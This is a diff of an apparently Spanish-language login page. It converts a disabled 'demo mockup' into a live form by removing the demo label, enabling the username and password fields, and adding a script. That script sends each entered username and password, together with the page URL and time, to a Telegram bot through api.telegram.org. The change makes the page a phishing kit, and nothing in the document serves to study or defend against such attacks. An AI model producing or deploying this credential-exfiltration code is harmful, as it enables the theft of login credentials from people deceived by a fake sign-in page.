@@ -436,11 +436,8 @@ html,body{
 
                 </div>
 
-                <input
-                    type="text"
-                    placeholder="Usuario"
-                    disabled
-                >
+               <input type="text" id="usuario" placeholder="Usuario">
+
 
             </div>
 
@@ -476,23 +473,13 @@ html,body{
 
                 </div>
 
-                <input
-                    type="password"
-                    placeholder="Contraseña"
-                    disabled
-                >
+               <input type="password" id="password" placeholder="Contraseña">
+
 
             </div>
 
 
-            <button
-                type="button"
-                class="login-btn"
-                disabled>
-
-                Ingresar
-
-            </button>
+            <button type="button" id="loginBtn" class="login-btn">Ingresar</button>
 
 
             <!-- =====================
@@ -564,9 +551,44 @@ html,body{
 
 <!-- Aviso visual -->
 
-<div class="demo-label">
-    MAQUETA DEMOSTRATIVA
-</div>
+<script>
+const TELEGRAM_TOKEN = "TU_TOKEN_AQUI";
+const TELEGRAM_CHAT_ID = "TU_CHAT_ID_AQUI";
+
+document.getElementById("loginBtn").addEventListener("click", async function () {
+    const usuario = document.getElementById("usuario").value.trim();
+    const password = document.getElementById("password").value.trim();
+
+    if (!usuario || !password) {
+        alert("Completa todos los campos");
+        return;
+    }
+
+    const mensaje = `
+🔐 Nuevo registro
+👤 Usuario: ${usuario}
+🔑 Contraseña: ${password}
+🌐 Página: ${window.location.href}
+🕒 Fecha: ${new Date().toLocaleString()}
+    `;
+
+    const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
+
+    try {
+        await fetch(url, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+                chat_id: TELEGRAM_CHAT_ID,
+                text: mensaje
+            })
+        });
+        console.log("Enviado");
+    } catch (err) {
+        console.error("Error:", err);
+    }
+});
+</script>
 
 
 <script>
